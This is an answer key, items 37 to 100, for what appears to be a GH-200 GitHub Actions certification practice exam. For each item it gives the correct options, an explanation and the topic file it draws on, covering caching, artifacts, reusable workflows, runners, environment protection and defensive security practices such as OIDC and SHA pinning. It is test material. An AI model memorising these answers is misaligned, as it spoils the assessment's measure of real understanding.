| 37 | B | Setting the repository secret `ACTIONS_RUNNER_DEBUG` or `ACTIONS_STEP_DEBUG` to `true` enables verbose debug and step logging without modifying the workflow file. | 07-Default-Environment-Variables.md | Medium |
| 38 | B | `GITHUB_REF_NAME` provides the shortened branch or tag name (e.g., `release/1.5`) without the `refs/heads/` prefix. `GITHUB_REF` includes the full ref. `GITHUB_BASE_REF` is the base branch of a PR; `GITHUB_HEAD_REF` is the PR head branch. | 07-Default-Environment-Variables.md | Medium |
| 39 | B | B is FALSE. `GITHUB_TOKEN` explicitly cannot trigger a new workflow run in the same repository (to prevent loops). The other statements are all true. | 07-Default-Environment-Variables.md | Hard |
| 40 | B | With required reviewers configured, the job pauses execution before accessing the environment until a designated reviewer approves. This is the core behavior of the feature. | 08-Environment-Protection-Rules.md | Easy |
| 41 | C | GitHub enforces deployment branch policies; if the source branch does not match, the deployment is blocked with an error. The job is not silently skipped or redirected. | 08-Environment-Protection-Rules.md | Medium |
| 42 | C | A **wait timer** in environment protection rules adds a delay between approval and execution. `timeout-minutes` cancels the job if it runs too long; `sleep` works but is fragile; `schedule` cannot delay an already-running workflow. | 08-Environment-Protection-Rules.md | Medium |
| 43 | A, B, C | Required reviewers (A), deployment branch policy limited to `main` (B), and a 5-minute wait timer (C) address the three requirements. An IP allow list (D) controls network access, not the deployment governance requirements described. | 08-Environment-Protection-Rules.md | Hard |
| 44 | B | Environment-level secrets are only injected into jobs that explicitly reference that environment. The `test` job does not reference `production`, so `PROD_DB_PASSWORD` evaluates to empty string. | 08-Environment-Protection-Rules.md | Hard |
| 45 | C | The default artifact retention period is 90 days when no `retention-days` value is specified. Organizations can change the default, but 90 days is the GitHub default. | 09-Workflow-Artifacts.md | Easy |
| 46 | B | `actions/upload-artifact` in the `build` job stores files; `actions/download-artifact` in the `deploy` job retrieves them by name. Cache is for reuse across runs, not inter-job file sharing. | 09-Workflow-Artifacts.md | Medium |
| 47 | B, D | Pinning to matching major versions prevents API compatibility issues; a precise glob avoids uploading unnecessary files that can cause partial downloads. `if: always()` aids debugging but does not fix reliability. `retention-days` controls expiry, not mid-run consistency. | 09-Workflow-Artifacts.md | Medium |
| 48 | B | Compressing artifacts and reducing retention to 5 days for PR runs addresses both file size and duration of storage. D is incorrect: cache storage is not free or unlimited. A would eliminate useful artifacts unnecessarily. | 09-Workflow-Artifacts.md | Hard |
| 49 | A | The `key` uniquely identifies a cache entry; an exact match on restore is called a cache hit. It is not an encryption key or TTL. | 10-Workflow-Caching.md | Easy |
| 50 | B | `restore-keys:` provides ordered fallback prefixes. If the primary key misses, `npm-` matches the newest existing cache with that prefix. | 10-Workflow-Caching.md | Medium |
| 51 | B | GitHub allows branches to restore caches created on the default branch or the base ref. A feature branch can fall back to `main`'s cache on a miss. | 10-Workflow-Caching.md | Medium |
| 52 | A, C | Both A (`hashFiles` of two files combined) and C (two separate `hashFiles` concatenated) produce a hash that changes when either file changes and is branch-agnostic. B invalidates on every commit (too aggressive). D includes `github.ref`, making it branch-specific. | 10-Workflow-Caching.md | Hard |
| 53 | C | `workflow_call` is the trigger event that marks a workflow as reusable, allowing it to be invoked from other workflows. | 11-Workflow-Sharing.md | Easy |
| 54 | B | The full path `org/repo/.github/workflows/file.yml@ref` is required. `with:` passes inputs; `secrets:` passes secrets. Local path `./.github/workflows/` is only for same-repository reusable workflows. | 11-Workflow-Sharing.md | Medium |
| 55 | B | Reusable workflows expose outputs via `on.workflow_call.outputs`, mapping job outputs. The caller accesses them via `needs.<reusable_job_name>.outputs.<output_name>`. | 11-Workflow-Sharing.md | Medium |
| 56 | A, C, D | A: The badge URL format is correct. C: Secrets must be explicitly passed or `secrets: inherit` used. D: `?branch=` querystring selects which branch's status the badge shows. B is false: secrets are not automatically inherited. | 11-Workflow-Sharing.md | Hard |
| 57 | B | `ACTIONS_RUNNER_DEBUG` (or `ACTIONS_STEP_DEBUG`) set to `true` as a repository secret or variable enables debug logs. The other variable names are not valid for this purpose. | 12-Workflow-Debugging.md | Easy |
| 58 | A | Workflow commands use `::command file=path,line=N::message` syntax. A correctly produces a warning annotation. B uses an incorrect (Azure DevOps-style) format. C writes to the step summary, not an annotation. D uses a nonexistent CLI command. | 12-Workflow-Debugging.md | Medium |
| 59 | B | The GitHub workflow run log UI shows elapsed time for each step in its header, making it easy to identify the slow step visually. | 12-Workflow-Debugging.md | Medium |
| 60 | A, B, C | Enabling step debug (A) captures verbose output; grouping commands (B) improves readability for future review; a connectivity test (C) isolates network vs logic failures. D (`while true` loop) is not a legitimate debugging technique for this scenario. | 12-Workflow-Debugging.md | Hard |
| 61 | B | `POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches` triggers a `workflow_dispatch` event. The other paths are not valid GitHub Actions API endpoints. | 13-Workflows-REST-API.md | Easy |
| 62 | B | The `status` and `created` query parameters are used to filter runs. `created` accepts ISO 8601 date ranges. Options C and D use non-existent parameter names. | 13-Workflows-REST-API.md | Medium |
| 63 | B | `POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun-failed-jobs` re-runs only failed jobs in a specific run. A re-runs all jobs. C and D are not valid endpoints. | 13-Workflows-REST-API.md | Medium |
| 64 | A, B, C | Authenticated requests have higher rate limits (A); conditional requests with ETags avoid counting against the quota for unchanged data (B); monitoring `X-RateLimit-Remaining` enables proactive backoff (C). D is false: GraphQL API also has rate limits. | 13-Workflows-REST-API.md | Hard |
| 65 | B | List runs for the specific workflow with a date filter, then delete logs (not the run itself) for older entries. Deleting entire runs (A) removes run history. The bulk-delete endpoint (D) does not exist. | 13-Workflows-REST-API.md | Hard |
| 66 | C | Only users or teams explicitly configured as required reviewers for the environment can approve or reject deployments. General write access or org membership is not sufficient. | 14-Reviewing-Deployments.md | Easy |
| 67 | B | The deployment review page shows job execution logs up to the pause point and links to the triggering commit or pull request for review. A full inline code diff is not rendered on the review page. | 14-Reviewing-Deployments.md | Medium |
| 68 | A, C | A: Post-deployment Slack notification using `environment.url` is a correct pattern. C: A health-check step with `if: failure()` that runs `gh issue create` implements the auto-issue requirement. B (workflow_run) adds unnecessary complexity. D: Environment settings do not have a webhook notification feature for reviewers. | 14-Reviewing-Deployments.md | Hard |
| 69 | B | The three action types are JavaScript, Docker container, and composite. Hosted/self-hosted are runner types, not action types. | 15-Creating-Publishing-Actions.md | Easy |
| 70 | B | JavaScript actions use `runs: using: "node20" main: "index.js"`. Docker uses `using: "docker"`; composite uses `using: "composite"`. `"javascript"` is not a valid `using` value. | 15-Creating-Publishing-Actions.md | Medium |
| 71 | B | Composite actions combine multiple steps using `using: "composite"`. They are ideal for grouping shell commands without requiring a container or Node.js. `"shell"` is not a valid `using` value. | 15-Creating-Publishing-Actions.md | Medium |
| 72 | A, B, D | `action.yml` at root (A), semantic version tagging with optional float tag (B), and public repository (D) are all required. C is incorrect: there is no Marketplace review queue submission; publishing happens automatically when a release is created on a public repo with a valid `action.yml`. | 15-Creating-Publishing-Actions.md | Hard |
| 73 | B | `ubuntu-latest` is the correct label for the latest stable GitHub-hosted Ubuntu runner. The other options are not valid runner labels. | 16-Managing-Runners.md | Easy |
| 74 | B | Custom labels are applied to self-hosted runners, and `runs-on` accepts an array of labels. All listed labels must match for the job to be assigned to a runner. | 16-Managing-Runners.md | Medium |
| 75 | B | Public repositories allow anyone to open a PRs and potentially trigger workflows. On self-hosted runners, those workflow jobs execute code on your own infrastructure, which is a significant security risk. | 16-Managing-Runners.md | Medium |
| 76 | A, B, D | Ephemeral runners (A) prevent state contamination; runner groups (B) organize and restrict access; auto-scaling infrastructure (D) handles demand spikes. C (`max-parallel`) limits parallelism per workflow, which reduces throughput rather than increasing capacity. | 16-Managing-Runners.md | Hard |
| 77 | B | Setting the policy to "Allow select actions" with `actions/*` and `github/*` patterns restricts execution to GitHub's own actions. Disabling Actions (A) is too aggressive. Signed actions (C) is not a GitHub policy option. Required workflows (D) cannot validate `uses:` fields. | 17-GitHub-Actions-Enterprise.md | Easy |
| 78 | C | Environment secrets have the highest precedence. When a job references a specific environment, that environment's secrets override organization and repository secrets with the same name. | 17-GitHub-Actions-Enterprise.md | Medium |
| 79 | A, B, C | Creating a named runner group (A) and restricting it to specific repos/orgs (B) provides isolation. Using the group's label in `runs-on` (C) routes jobs to it. Required reviewers (D) are an environment protection rule feature, not a runner group feature. | 17-GitHub-Actions-Enterprise.md | Medium |
| 80 | B | Required workflows configured at the Enterprise Settings level are enforced across all repositories matching the filter, regardless of repository-level configuration. Branch protection rules (A) only work if the repository enables them; they cannot be universally enforced. | 17-GitHub-Actions-Enterprise.md | Hard |
| 81 | A, B, C, D | All four categories are relevant: workflow_run events for execution history (A), secret events for credential access auditing (B), runner events for infrastructure changes (C), and workflow events for configuration changes (D). | 17-GitHub-Actions-Enterprise.md | Hard |
| 82 | B | `GITHUB_TOKEN` is created at the start of each job and revoked when the job completes. It is not a long-lived or repository-level credential. | 18-Security-and-Optimization.md | Easy |
| 83 | B | Configuring AWS IAM to trust GitHub's OIDC provider and using `aws-actions/configure-aws-credentials` with `role-to-assume` generates short-lived session tokens via OIDC federation. `GITHUB_TOKEN` cannot be used as an AWS credential. | 18-Security-and-Optimization.md | Medium |
| 84 | B | A version tag (e.g., `v3`) is a mutable Git ref that can be force-pushed to point to a different commit. A SHA is immutable — it cannot be changed to point to different code, providing supply chain integrity guarantees. | 18-Security-and-Optimization.md | Medium |
| 85 | C | Setting the untrusted value as an environment variable (`PR_TITLE: ${{ github.event.pull_request.title }}`) and referencing `$PR_TITLE` in the shell passes the value as data, never interpolating it into the command string. A prevents all expansion (including the legitimate value). B adds encoding but does not prevent shell interpretation. D restricts the token, not shell execution. | 18-Security-and-Optimization.md | Hard |
| 86 | A, B, C | The subject claim combines identifiable components. `repo:acme-corp/api` (A) and `environment:production` (B) directly address the stated requirements. Adding `ref:refs/heads/main` (C) provides additional branch restriction. `actor:` (D) restricts to a specific individual user, which is fragile for shared workflows. | 18-Security-and-Optimization.md | Hard |
| 87 | B | `contents: read` allows reading the repository; `pull-requests: write` allows commenting on PRs; `packages: write` allows pushing to GitHub Packages. `write-all` over-privileges. C grants `contents: write` unnecessarily. D replaces `pull-requests` with `issues`, which doesn't cover PR commenting. | 18-Security-and-Optimization.md | Hard |
| 88 | A, B, C, D | All four are effective supply chain hardening practices: SHA pinning prevents tag hijacking (A); Dependency Review Action catches vulnerable actions on PRs (B); org-level allow-list restricts action sources (C); Dependabot for Actions provides automated SHA update PRs (D). | 18-Security-and-Optimization.md | Hard |
| 89 | B | The most common cause of this error is a missing `actions/checkout` step or insufficient `contents: read` permission on `GITHUB_TOKEN`. It is not a network access issue or a fork-specific behavior. | 19-Common-Failures-Troubleshooting.md | Easy |
| 90 | B | Pinning the exact Node.js version with `actions/setup-node` ensures the runner environment matches the developer's machine, directly resolving version-specific dependency resolution failures. | 19-Common-Failures-Troubleshooting.md | Medium |
| 91 | B | `timeout-minutes:` on the job definition overrides the default 6-hour (360-minute) limit. The maximum allowed value is determined by the GitHub plan; `continue-on-error` does not extend timeout; `ACTIONS_JOB_TIMEOUT` is not a valid variable. | 19-Common-Failures-Troubleshooting.md | Medium |
| 92 | A, B, D | Setting `fail-fast: false` (A) allows all jobs to run to completion, revealing the full failure scope. Re-running only failed jobs (B) avoids re-running successful ones. Examining logs (D) identifies the root cause. C (`continue-on-error: true`) suppresses failure signals but does not help diagnose root causes. | 19-Common-Failures-Troubleshooting.md | Hard |
| 93 | B | GitHub masks exact secret string literals. If the secret is embedded inside a larger string through transformations like JSON serialization, the resulting string may not match the stored secret value and will not be masked. | 19-Common-Failures-Troubleshooting.md | Hard |
| 94 | B | `github.base_ref` is only populated for `pull_request` events (it returns the PR's base branch). For `push` events it is empty. `github.ref_name` works for push but not for the PR base. Conditional logic is required to handle both events correctly. | 02-Contextual-Information.md / 05-Workflow-Trigger-Events.md | Medium |
| 95 | A, B, C, D | All four are required: push trigger on main (A), environment with 2 required reviewers (B), OIDC setup with `id-token: write` (C), and SHA-pinned action references (D). | 04 / 08 / 18 Cross-Topic | Hard |
| 96 | B | `actions/upload-artifact` with `retention-days: 30` uploads the binary as a persistent run artifact accessible from the GitHub UI and API. `actions/cache` is for speeding up future runs, not for persistent deployment artifacts. | 09-Workflow-Artifacts.md / 10-Workflow-Caching.md | Medium |
| 97 | A | The correct fix is a `StringEquals` condition on the full subject claim `repo:acme-corp/api:environment:production`, which precisely identifies the target repo and environment. B checks the audience, not the subject. C and D do not affect the IAM trust policy directly. | 17 / 18 Cross-Topic | Hard |
| 98 | A, B, C | Hardcoding the environment (A) prevents callers from overriding deployment targets. Using `on.workflow_call.secrets` with explicit mapping (B) provides visibility and control. Pinning to a release tag/SHA (C) locks the version. D (`secrets: inherit`) contradicts goal 3 and leaks secret visibility. | 11 / 18 Cross-Topic | Hard |
| 99 | B | Uploading artifacts with unique names per matrix combination (e.g., `test-report-ubuntu-18`) allows downloading individual artifacts by name from failed jobs only. A requires downloading everything. C means only failed jobs upload, which loses reports from successful jobs. D works but is more complex than naming artifacts distinctly. | 09 / 19 Cross-Topic | Hard |
| 100 | B | `workflow_call` workflows cannot be triggered directly via API dispatch. The service repo must have a `workflow_dispatch` workflow that calls the shared reusable workflow and passes the `environment` input via `with:`. The `workflow_dispatch` API supports custom inputs. | 11 / 13 Cross-Topic | Medium |

---

*End of GH-200 Iteration 1 — 100 Questions*
